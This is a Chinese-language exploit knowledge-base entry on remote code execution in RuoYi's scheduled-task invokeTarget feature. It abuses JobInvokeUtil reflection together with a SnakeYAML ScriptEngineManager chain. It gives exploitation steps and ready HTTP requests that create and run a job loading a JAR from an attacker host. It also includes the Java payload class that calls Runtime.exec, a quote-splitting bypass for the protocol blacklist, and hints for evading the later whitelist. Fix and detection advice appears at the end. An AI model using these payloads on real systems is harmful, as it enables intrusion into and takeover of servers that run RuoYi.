---
id: web-java-rce-ruoyi-job-invoke-target-reflection-snakeyaml
title: RuoYi 定时任务调用目标字符串反射 RCE：JobInvokeUtil 任意类方法调用 + SnakeYAML 链与协议黑名单单引号绕过
type: scenario
domain: web
path: web/java/rce
technique: ruoyi-job-invoke-target-reflection-rce
aliases:
- RuoYi 定时任务 RCE
- 若依 invokeTarget
- JobInvokeUtil.invokeMethod
- 调用目标字符串 命令执行
- Quartz 反射调用 RCE
- yaml-payload
- h't't'p 绕过
tags:
- java
- ruoyi
- quartz
- rce
- reflection
- snakeyaml
- invoke-target
- blacklist-bypass
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: <= 4.6.2（原文漏洞对比表）；4.6.2~4.7.1 协议黑名单可被单引号拆分绕过，4.7.2 增加调用类白名单（原文）
verification:
  verified_by: verifier-V201
  verified_at: '2026-11-07T02:10:57+08:00'
  notes: 已对照原文与全部61张图核对；单引号协议绕过为原文修复说明，未实测；未复跑环境
---

## 一句话结论

RuoYi 的定时任务把用户填写的“调用目标字符串”交给 `JobInvokeUtil.invokeMethod()`，后者先查 Spring Bean，找不到就把前半段当类名 `Class.forName` + `newInstance` 再反射调用指定方法，且无类/方法白名单；攻击者以管理员身份添加任务 `org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [...URLClassLoader...]')`，触发时 SnakeYAML 远程加载恶意 JAR 执行命令，从而 RCE。

## 原理

- **调用目标字符串解析**：RuoYi 支持 `beanName.method(params)` 或 `com.example.ClassName.method(params)` 两种形式。`JobInvokeUtil.invokeMethod(invokeTarget)` 先按 `(` 截取方法部分、按 `.` 拆分类/方法名，再解析参数列表（字符串、布尔、长整数等）。
- **Bean 与任意类**：若类名不以 `com.ruoyi` 等约定 Bean 形式存在，代码会 `Class.forName(className).newInstance()` 得到对象，再用 `getMethod(methodName, parameterTypes)` 反射调用；Spring 容器中不存在的类也会被加载，没有任何类名/方法名白名单。
- **入口与触发**：管理员在“系统监控 → 定时任务 → 添加/编辑”提交 `invokeTarget` 与 cron 表达式，或直接调用 `/monitor/job/run` 立即触发；`Scheduler.triggerJob` → `QuartzDisallowConcurrentExecution`/`QuartzJobExecution` → `JobInvokeUtil.invokeMethod()`。
- **SnakeYAML 链**：RuoYi 依赖链中存在 SnakeYAML。构造 `org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/yaml-payload.jar"]]]]')` 后，`Yaml.load` 使用不安全默认构造器实例化 `ScriptEngineManager(ClassLoader)`；其 `initEngines` → `ServiceLoader.load` → 通过攻击者 `URLClassLoader` 拉取 `META-INF/services/javax.script.ScriptEngineFactory`，实例化远程 JAR 中的实现类，构造函数执行命令。
- **为什么成立**：定时任务功能本意是调用受信 Bean 的方法，但实现把“类名/方法名/参数”全部交由用户控制并反射执行；SnakeYAML 的 `!!` 全局标签又把字符串参数升级为任意类实例化，两个能力叠加即 RCE。
- **修复与绕过**：
  - 4.6.2~4.7.1：在新增/编辑处检查 `invokeTarget` 是否包含 `ldap`、`rmi`、`http(s)` 等协议；原文称可用单引号拆分协议名（如 `h't't'p://`）绕过字符串检查（具体是否可达取决于目标版本与解析层，需实测）。
  - 4.7.2+：额外增加调用类白名单（只允许特定包/类），文中列出的 `org.yaml.snakeyaml.Yaml` 等类不可用。
- **执行身份**：命令以应用进程用户（通常为启动 RuoYi 的服务账号）执行，不是数据库或浏览器身份。

## 触发条件

- RuoYi <= 4.6.2（原文对比表）；4.6.2~4.7.1 若仅做协议黑名单，可能被单引号拆分绕过。
- 攻击者拥有定时任务管理权限（`monitor:job:add`/`monitor:job:run`，默认 admin 或授予该权限的角色）。
- 目标 classpath 存在 SnakeYAML（RuoYi/Spring Boot 依赖链通常包含），或存在其它可被反射调用的危险类。
- 目标 JVM 能出网访问攻击者 HTTP 服务（远程 JAR/SPI）；无出网时可尝试 `file:`/`jar:` 或本机已有类。
- 目标 JDK 未对远程 codebase/类加载做额外限制。

## 利用步骤

1. 以管理员登录，确认“系统监控 → 定时任务”可用，抓取新增/运行请求（`/monitor/job/add`、`/monitor/job/run`）。
2. 准备 yaml-payload：实现 `javax.script.ScriptEngineFactory`，在构造方法中执行命令；在 `META-INF/services/javax.script.ScriptEngineFactory` 注册类名；编译打包为 `yaml-payload.jar`，与 SPI 文件放到攻击者 HTTP 根目录。
3. 添加任务：
   - `jobName=test`、`jobGroup=DEFAULT`、`invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker:9000/yaml-payload.jar"]]]]')`、`cronExpression=0/10 * * * * ?`、`misfirePolicy=1`、`concurrent=0`、`status=0`。
4. 调用 `/monitor/job/run` 立即执行一次（或等待 cron）。
5. 观察攻击者 HTTP 日志出现 `META-INF/services/javax.script.ScriptEngineFactory` 与 `yaml-payload.jar` 请求，目标执行命令（弹计算器/回连/写文件）。
6. 若 4.6.2~4.7.1 报协议黑名单，尝试在协议名中插入单引号（文章方法，需按目标实测）；若 4.7.2+ 类白名单拦截，改找白名单内的危险 Bean 方法或其它反射链。
7. 验证后删除任务，清理载荷与落地文件。

## PoC

```http
POST /monitor/job/add HTTP/1.1
Host: target
Cookie: JSESSIONID=<admin 会话>
Content-Type: application/x-www-form-urlencoded

jobName=test&jobGroup=DEFAULT&invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker:9000/yaml-payload.jar"]]]]')&cronExpression=0/10 * * * * ?&misfirePolicy=1&concurrent=0&status=0
```

```http
POST /monitor/job/run HTTP/1.1
Host: target
Cookie: JSESSIONID=<admin 会话>
Content-Type: application/x-www-form-urlencoded

jobId=<新增任务 ID>&jobGroup=DEFAULT
```

```java
// yaml-payload 的 ScriptEngineFactory 实现（节选）
package artsploit;
import javax.script.*;
import java.io.IOException;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try { Runtime.getRuntime().exec("calc"); }
        catch (IOException e) { e.printStackTrace(); }
    }
    // 其余接口方法返回 null 即可
}
```

```text
META-INF/services/javax.script.ScriptEngineFactory 内容：
artsploit.AwesomeScriptEngineFactory
```

```text
4.6.2~4.7.1 协议黑名单绕过（原文方法，需实测）：
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["h't't'p://attacker:9000/yaml-payload.jar"]]]]')
```

## 变体与关联

- 变体：把 `Yaml.load` 换成 classpath 上其它带危险构造/setter 的类；或直接调用 Spring Bean 中可执行命令的方法。
- 变体：无出网时用 `file:`/`jar:` 本地载荷、TemplatesImpl/BCEL 等不依赖远程 HTTP 的链。
- 变体：4.7.2 类白名单可通过白名单包内的类、Spring Bean 方法名或参数类型混淆绕过，需按版本审计。
- 关联：[[web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce]]（SnakeYAML ScriptEngineManager 链的完整原理）、[[web-generic-sqli-ruoyi-datascope-params-admin-bypass]]、[[web-generic-sqli-ruoyi-dept-ancestors-second-order-in]]（同产品其他后台漏洞）。

## 检测与防御

- 修复：升级到 4.7.2+ 并使用调用类白名单；只允许受信 Bean 的显式方法，禁止 `Class.forName` + `newInstance` 任意类。
- 修复：对 `invokeTarget` 做结构化解析与白名单校验（类名、方法名、参数类型全部枚举），而不是字符串黑名单。
- 加固：定时任务功能仅授予必要管理员；默认 admin 口令必须修改；限制应用出站 HTTP（egress 白名单）；移除/限制 SnakeYAML 不安全解析。
- 检测：`invokeTarget` 中出现 `org.yaml.snakeyaml`、`javax.script`、`java.net.URLClassLoader`、`!!`、`h't't'p` 等特征；任务创建后立即 run；服务器向陌生域名请求 `META-INF/services/*` 或 `.jar`；应用进程派生 `calc`/`sh`/`bash`。
